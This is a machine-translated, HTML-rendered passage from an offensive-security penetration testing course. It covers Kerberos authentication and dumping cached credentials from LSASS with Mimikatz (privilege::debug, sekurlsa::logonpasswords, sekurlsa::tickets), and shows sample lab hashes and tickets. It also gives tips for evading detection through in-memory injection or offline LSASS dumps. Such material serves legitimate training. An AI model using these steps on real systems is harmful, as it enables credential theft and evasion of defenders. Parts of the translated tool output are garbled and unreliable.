<div style="position:absolute;top:35042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AP_REQ</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">如果</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AP_REQ</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名与从服务票据中解密的用户名匹配，则</font></font></nobr></div>
<div style="position:absolute;top:35061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求被接受。</font><font style="vertical-align: inherit;">在授予访问权限之前，该服务会检查提供的组</font></font></nobr></div>
<div style="position:absolute;top:35081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务票证中的成员资格，并为用户分配适当的权限，之后</font></font></nobr></div>
<div style="position:absolute;top:35100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户可以访问请求的服务。</font></font></nobr></div>
<div style="position:absolute;top:35133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该协议可能看起来很复杂，甚至可能令人费解，但它旨在减轻</font></font></nobr></div>
<div style="position:absolute;top:35152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种网络攻击并防止使用虚假凭据。</font></font></nobr></div>
<div style="position:absolute;top:35185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经探索了 NTLM 和 Kerberos 身份验证的基础，让我们</font></font></nobr></div>
<div style="position:absolute;top:35204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">探索各种缓存凭据存储和服务帐户攻击。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:35238;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.3</font></font></i></nobr></div>
<div style="position:absolute;top:35238;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存凭据存储和检索</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了为缓存存储凭据攻击奠定基础，我们必须首先讨论各种</font></font></nobr></div>
<div style="position:absolute;top:35296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 Kerberos 一起使用的密码哈希并显示它们的存储方式。</font></font></nobr></div>
<div style="position:absolute;top:35329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 Microsoft 的 Kerberos 实现使用了单点登录，因此密码哈希必须</font></font></nobr></div>
<div style="position:absolute;top:35348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在某处以更新 TGT 请求。</font><font style="vertical-align: inherit;">在当前版本的 Windows 中，这些</font></font></nobr></div>
<div style="position:absolute;top:35367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">散列存储在本地安全机构子系统服务 (LSASS) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">646</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存空间中。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">647</font></font></font></nobr></div>
<div style="position:absolute;top:35400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们能够访问这些哈希，我们就可以破解它们以获得明文密码或重用</font></font></nobr></div>
<div style="position:absolute;top:35420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们执行各种操作。</font></font></nobr></div>
<div style="position:absolute;top:35452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这是我们 AD 攻击的最终目标，但过程并不像听起来那么简单。</font></font></nobr></div>
<div style="position:absolute;top:35472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 LSASS 进程是操作系统的一部分并作为 SYSTEM 运行，我们需要 SYSTEM</font></font></nobr></div>
<div style="position:absolute;top:35491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（或本地管理员）访问存储在目标上的哈希的权限。</font></font></nobr></div>
<div style="position:absolute;top:35524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正因为如此，为了针对存储的哈希值，我们经常不得不从本地开始我们的攻击</font></font></nobr></div>
<div style="position:absolute;top:35543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权升级。</font><font style="vertical-align: inherit;">更棘手的是，用于存储散列的数据结构</font></font></nobr></div>
<div style="position:absolute;top:35563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存中的数据没有公开记录，它们也使用 LSASS 存储的密钥进行加密。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:35667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">646 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://technet.microsoft.com/en-us/library/cc961760.aspx</font></font></font></nobr></div>
<div style="position:absolute;top:35687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">647 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（本杰明·德尔菲，2013 年），http://blog.gentilkiwi.com/securite/mimikatz/sekurlsa-credman#getLogonPasswords</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:35815;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="31"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 31 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:35848;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:36925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:36925;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:36925;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">648</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管如此，由于这是一个针对 Windows 和 Active Directory 的巨大攻击媒介，因此有几个工具</font></font></nobr></div>
<div style="position:absolute;top:35963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经创建来提取哈希，其中最受欢迎的是 Mimikatz。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">648</font></font></font></nobr></div>
<div style="position:absolute;top:35996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试使用 Mimikatz 在我们的 Windows 10 系统上提取哈希。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:36058;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在以下示例中，我们将 Mimikatz 作为独立应用程序运行。</font></font></i></nobr></div>
<div style="position:absolute;top:36077;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，由于 Mimikatz 的主流流行和众所周知的</font></font></i></nobr></div>
<div style="position:absolute;top:36097;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测签名，请考虑避免将其用作独立应用程序。</font><font style="vertical-align: inherit;">为了</font></font></i></nobr></div>
<div style="position:absolute;top:36116;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，使用注入器直接从内存中执行 Mimikatz</font></font></i></nobr></div>
<div style="position:absolute;top:36135;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">649</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或使用任务管理器等内置工具转储整个 LSASS</font></font></i></nobr></div>
<div style="position:absolute;top:36155;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理内存，将转储的数据移动到辅助机器，然后从那里，</font></font></i></nobr></div>
<div style="position:absolute;top:36174;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将数据加载到 Mimikatz 中。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">650</font></font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:36236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 Offsec 域用户是本地管理员，我们可以启动命令提示符</font></font></nobr></div>
<div style="position:absolute;top:36256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有提升的权限。</font><font style="vertical-align: inherit;">在这个命令提示符下，我们将运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 651</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并输入</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:36275;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">privilege::debug</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font></font><i><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeDebugPrivlege</font></font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 652</font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限，这将允许我们与</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:36294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个帐户拥有的进程。</font></font></nobr></div>
<div style="position:absolute;top:36327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们将运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sekurlsa::logonpasswords</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以使用转储所有登录用户的凭据</font></font></nobr></div>
<div style="position:absolute;top:36347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sekurlsa </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">653</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块。</font></font></nobr></div>
<div style="position:absolute;top:36379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这应该转储登录到当前工作站或服务器的所有用户的哈希值，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括</font></font></i></nobr></div>
<div style="position:absolute;top:36399;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程登录，</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如远程桌面会话。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:36433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Tools\active_directory&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:36467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz #</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权::调试</font></font></font></b></nobr></div>
<div style="position:absolute;top:36485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限 '20' OK</font></font></nobr></div>
<div style="position:absolute;top:36518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sekurlsa::logonpasswords</font></font></font></b></nobr></div>
<div style="position:absolute;top:36552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证 ID : 0 ; </font><font style="vertical-align: inherit;">291668 (00000000:00047354)</font></font></nobr></div>
<div style="position:absolute;top:36569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会议    </font></font></nobr></div>
<div style="position:absolute;top:36569;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 互动从 1</font></font></nobr></div>
<div style="position:absolute;top:36586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名    </font></font></nobr></div>
<div style="position:absolute;top:36586;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 离场</font></font></nobr></div>
<div style="position:absolute;top:36603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域    </font></font></nobr></div>
<div style="position:absolute;top:36603;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 公司</font></font></nobr></div>
<div style="position:absolute;top:36620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录服务器：DC01</font></font></nobr></div>
<div style="position:absolute;top:36637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录时间    </font></font></nobr></div>
<div style="position:absolute;top:36637;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 08/02/2018 14.23.26</font></font></nobr></div>
<div style="position:absolute;top:36654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准识别码    </font></font></nobr></div>
<div style="position:absolute;top:36654;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: S-1-5-21-1602875587-2787523311-2599479668-1103</font></font></nobr></div>
<div style="position:absolute;top:36671;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微信：</font></font></nobr></div>
<div style="position:absolute;top:36688;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[00000003] 初级</font></font></nobr></div>
<div style="position:absolute;top:36705;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 用户名 : Offsec</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:36761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">648 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（本杰明·德尔菲，2018 年），https://github.com/gentilkiwi/mimikatz</font></font></font></nobr></div>
<div style="position:absolute;top:36781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">649 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（马特格雷伯，2016 年），https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:36796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反射PEInjection.ps1</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:36815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">650 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（鲁本·布南，2016 年），http://www.fuzzysecurity.com/tutorials/18.html</font></font></font></nobr></div>
<div style="position:absolute;top:36835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">651 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（本杰明·德尔福，2014 年），https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa</font></font></font></nobr></div>
<div style="position:absolute;top:36855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">652 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/bb530716 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:36875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">653 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mimikatz，2019），https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:37003;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="32"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 32 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:37036;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:38113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:38113;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:38113;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">649</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37132;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 域：CORP</font></font></nobr></div>
<div style="position:absolute;top:37148;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTLM : e2b475c11da2a0748290d87aa966c327</font></font></font></b></nobr></div>
<div style="position:absolute;top:37165;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SHA1：8c77f430e4ab8acb10ead387d64011c76400d26e</font></font></font></b></nobr></div>
<div style="position:absolute;top:37182;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* DPAPI：162d313bede93b0a2e72a030ec9210f0</font></font></nobr></div>
<div style="position:absolute;top:37200;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">茶匙：</font></font></nobr></div>
<div style="position:absolute;top:37216;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">摘要：</font></font></nobr></div>
<div style="position:absolute;top:37233;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 用户名 : Offsec</font></font></nobr></div>
<div style="position:absolute;top:37250;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 域：CORP</font></font></nobr></div>
<div style="position:absolute;top:37267;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 密码：（空）</font></font></nobr></div>
<div style="position:absolute;top:37284;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核：</font></font></nobr></div>
<div style="position:absolute;top:37301;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 用户名 : Offsec</font></font></nobr></div>
<div style="position:absolute;top:37318;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 域：CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:37335;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 密码：（空）</font></font></nobr></div>
<div style="position:absolute;top:37352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:37371;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 689 - 在域工作站上执行 mimikatz</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的输出片段显示了域用户存储在 LSASS 中的所有凭据信息</font></font></nobr></div>
<div style="position:absolute;top:37420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offsec，包括缓存的哈希值。</font></font></nobr></div>
<div style="position:absolute;top:37453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，我们在上面的输出中突出显示了两种类型的哈希。</font><font style="vertical-align: inherit;">这将根据</font></font></nobr></div>
<div style="position:absolute;top:37472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AD 实现的功能级别。</font><font style="vertical-align: inherit;">对于 Windows 功能级别的 AD 实例</font></font></nobr></div>
<div style="position:absolute;top:37492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2003 年，NTLM 是唯一可用的散列算法。</font><font style="vertical-align: inherit;">对于运行 Windows Server 2008 的实例</font></font></nobr></div>
<div style="position:absolute;top:37511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或更高版本，NTLM 和 SHA-1（AES 加密的常见伴侣）可能都可用。</font><font style="vertical-align: inherit;">上</font></font></nobr></div>
<div style="position:absolute;top:37530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">较旧的操作系统，如 Windows 7，或手动设置的操作系统，WDigest，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">654</font></font></font></nobr></div>
<div style="position:absolute;top:37550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将被启用。</font><font style="vertical-align: inherit;">启用 WDigest 后，运行 Mimikatz 将显示明文密码</font></font></nobr></div>
<div style="position:absolute;top:37569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与密码哈希一起。</font></font></nobr></div>
<div style="position:absolute;top:37602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有了这些哈希值，我们就可以尝试破解它们并获得明文密码。</font></font></nobr></div>
<div style="position:absolute;top:37635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mimikatz 的另一种方法和用途是通过滥用 TGT 和</font></font></nobr></div>
<div style="position:absolute;top:37654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务票。</font><font style="vertical-align: inherit;">如前所述，我们知道用户的 Kerberos TGT 和服务票证</font></font></nobr></div>
<div style="position:absolute;top:37673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前登录到本地机器的存储以备将来使用。</font><font style="vertical-align: inherit;">这些门票也存储在</font></font></nobr></div>
<div style="position:absolute;top:37693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LSASS，我们可以使用 Mimikatz 来交互和检索我们自己的票和</font></font></nobr></div>
<div style="position:absolute;top:37712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他本地用户。</font></font></nobr></div>
<div style="position:absolute;top:37745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，在清单 690 中，我们使用 Mimikatz 来显示 Offsec 用户的票证，这些票证存储在</font></font></nobr></div>
<div style="position:absolute;top:37764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记忆：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sekurlsa::tickets</font></font></font></b></nobr></div>
<div style="position:absolute;top:37833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证 ID : 0 ; </font><font style="vertical-align: inherit;">291668 (00000000:00047354)</font></font></nobr></div>
<div style="position:absolute;top:37850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会议    </font></font></nobr></div>
<div style="position:absolute;top:37850;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 互动从 1</font></font></nobr></div>
<div style="position:absolute;top:37867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名    </font></font></nobr></div>
<div style="position:absolute;top:37867;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 离场</font></font></nobr></div>
<div style="position:absolute;top:37884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域    </font></font></nobr></div>
<div style="position:absolute;top:37884;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 公司</font></font></nobr></div>
<div style="position:absolute;top:37901;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录服务器：DC01</font></font></nobr></div>
<div style="position:absolute;top:37918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录时间    </font></font></nobr></div>
<div style="position:absolute;top:37918;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 08/02/2018 14.23.26</font></font></nobr></div>
<div style="position:absolute;top:37935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准识别码    </font></font></nobr></div>
<div style="position:absolute;top:37935;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: S-1-5-21-1602875587-2787523311-2599479668-1103</font></font></nobr></div>
<div style="position:absolute;top:37969;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 用户名：Offsec</font></font></nobr></div>
<div style="position:absolute;top:37986;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 域名：CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:38003;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 密码：（空）</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:38063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">654 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2003 年），https:</font></font><font style="vertical-align: inherit;"> //technet.microsoft.com/en-us/library/cc778868 </font><font style="font-size:9px"><font style="vertical-align: inherit;">(v=</font></font><font style="vertical-align: inherit;"> ws.10 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">).aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:38191;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="33"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 33 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:38224;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:39301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:39301;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:39301;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">650</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组 0 -</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证授予服务</font></font></font></b></nobr></div>
<div style="position:absolute;top:38353;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[00000000]</font></font></nobr></div>
<div style="position:absolute;top:38370;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始/结束/MaxRenew: 09/02/2018 14.41.47 ; </font><font style="vertical-align: inherit;">10/02/2018 00.41.47 ; </font><font style="vertical-align: inherit;">16/02/2018 14.41.47</font></font></nobr></div>
